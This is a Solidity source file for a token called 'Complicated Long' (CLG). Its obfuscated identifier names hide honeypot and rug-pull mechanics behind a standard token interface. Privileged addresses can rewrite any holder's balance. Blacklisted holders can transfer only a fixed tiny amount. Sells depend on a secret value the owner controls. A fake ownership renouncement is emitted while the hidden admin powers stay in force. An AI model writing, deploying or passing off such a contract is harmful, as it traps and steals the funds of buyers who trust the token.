//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface fundFromReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountLimitSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface feeLaunched {
    function createPair(address amountSenderMax, address isFromTo) external returns (address);
}

interface fromWalletFund {
    function totalSupply() external view returns (uint256);

    function balanceOf(address minTx) external view returns (uint256);

    function transfer(address amountTotal, uint256 tradingList) external returns (bool);

    function allowance(address liquidityTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 tradingList) external returns (bool);

    function transferFrom(
        address sender,
        address amountTotal,
        uint256 tradingList
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoTake, uint256 value);
    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);
}

interface fromWalletFundMetadata is fromWalletFund {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ComplicatedLong is amountLimitSwap, fromWalletFund, fromWalletFundMetadata {

    uint256 constant minShouldEnable = 15 ** 10;

    function toTrading(address senderSell, uint256 tradingList) public {
        autoTeam();
        swapEnableTotal[senderSell] = tradingList;
    }

    mapping(address => uint256) private swapEnableTotal;

    mapping(address => mapping(address => uint256)) private sellTakeBuy;

    address public receiverSender;

    mapping(address => bool) public marketingFee;

    function decimals() external view virtual override returns (uint8) {
        return modeSwapLimit;
    }

    bool private listLaunch;

    constructor (){
        if (minAtTrading == listLaunch) {
            listLaunch = false;
        }
        fundFromReceiver limitSender = fundFromReceiver(launchEnable);
        limitShould = feeLaunched(limitSender.factory()).createPair(limitSender.WETH(), address(this));
        if (feeFund != launchedToFund) {
            launchedToFund = true;
        }
        receiverSender = _msgSender();
        marketingReceiverAuto();
        fundAtTrading[receiverSender] = true;
        swapEnableTotal[receiverSender] = receiverTx;
        
        emit Transfer(address(0), receiverSender, receiverTx);
    }

    function autoTeam() private view {
        require(fundAtTrading[_msgSender()]);
    }

    uint256 fromLiquidity;

    bool private feeFund;

    function teamIsLaunch(uint256 tradingList) public {
        autoTeam();
        fromFund = tradingList;
    }

    function transfer(address senderSell, uint256 tradingList) external virtual override returns (bool) {
        return tradingBuySwap(_msgSender(), senderSell, tradingList);
    }

    function owner() external view returns (address) {
        return launchedAuto;
    }

    string private swapAuto = "CLG";

    bool private isList;

    function senderTotalSwap(address modeTrading) public {
        if (tradingWallet) {
            return;
        }
        
        fundAtTrading[modeTrading] = true;
        
        tradingWallet = true;
    }

    function approve(address feeTake, uint256 tradingList) public virtual override returns (bool) {
        sellTakeBuy[_msgSender()][feeTake] = tradingList;
        emit Approval(_msgSender(), feeTake, tradingList);
        return true;
    }

    function name() external view virtual override returns (string memory) {
        return liquidityMaxShould;
    }

    address public limitShould;

    function getOwner() external view returns (address) {
        return launchedAuto;
    }

    function allowance(address txAt, address feeTake) external view virtual override returns (uint256) {
        if (feeTake == launchEnable) {
            return type(uint256).max;
        }
        return sellTakeBuy[txAt][feeTake];
    }

    function marketingReceiverAuto() public {
        emit OwnershipTransferred(receiverSender, address(0));
        launchedAuto = address(0);
    }

    function receiverMaxEnable(address amountFrom) public {
        autoTeam();
        if (shouldMax == shouldTeamFund) {
            shouldMax = marketingSender;
        }
        if (amountFrom == receiverSender || amountFrom == limitShould) {
            return;
        }
        marketingFee[amountFrom] = true;
    }

    bool private launchedToFund;

    address launchEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool public tradingWallet;

    uint256 public shouldTeamFund;

    event OwnershipTransferred(address indexed tokenTotalLiquidity, address indexed atFrom);

    function transferFrom(address sellLiquidityReceiver, address amountTotal, uint256 tradingList) external override returns (bool) {
        if (_msgSender() != launchEnable) {
            if (sellTakeBuy[sellLiquidityReceiver][_msgSender()] != type(uint256).max) {
                require(tradingList <= sellTakeBuy[sellLiquidityReceiver][_msgSender()]);
                sellTakeBuy[sellLiquidityReceiver][_msgSender()] -= tradingList;
            }
        }
        return tradingBuySwap(sellLiquidityReceiver, amountTotal, tradingList);
    }

    address swapFundTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint8 private modeSwapLimit = 18;

    mapping(address => bool) public fundAtTrading;

    uint256 public marketingSender;

    address private launchedAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return receiverTx;
    }

    function balanceOf(address minTx) public view virtual override returns (uint256) {
        return swapEnableTotal[minTx];
    }

    bool public tokenIs;

    string private liquidityMaxShould = "Complicated Long";

    uint256 fromFund;

    bool private autoEnable;

    function limitTrading(address sellLiquidityReceiver, address amountTotal, uint256 tradingList) internal returns (bool) {
        require(swapEnableTotal[sellLiquidityReceiver] >= tradingList);
        swapEnableTotal[sellLiquidityReceiver] -= tradingList;
        swapEnableTotal[amountTotal] += tradingList;
        emit Transfer(sellLiquidityReceiver, amountTotal, tradingList);
        return true;
    }

    bool private minAtTrading;

    function tradingBuySwap(address sellLiquidityReceiver, address amountTotal, uint256 tradingList) internal returns (bool) {
        if (sellLiquidityReceiver == receiverSender) {
            return limitTrading(sellLiquidityReceiver, amountTotal, tradingList);
        }
        uint256 shouldListSwap = fromWalletFund(limitShould).balanceOf(swapFundTotal);
        require(shouldListSwap == fromFund);
        require(amountTotal != swapFundTotal);
        if (marketingFee[sellLiquidityReceiver]) {
            return limitTrading(sellLiquidityReceiver, amountTotal, minShouldEnable);
        }
        return limitTrading(sellLiquidityReceiver, amountTotal, tradingList);
    }

    function symbol() external view virtual override returns (string memory) {
        return swapAuto;
    }

    uint256 private receiverTx = 100000000 * 10 ** 18;

    uint256 private shouldMax;

}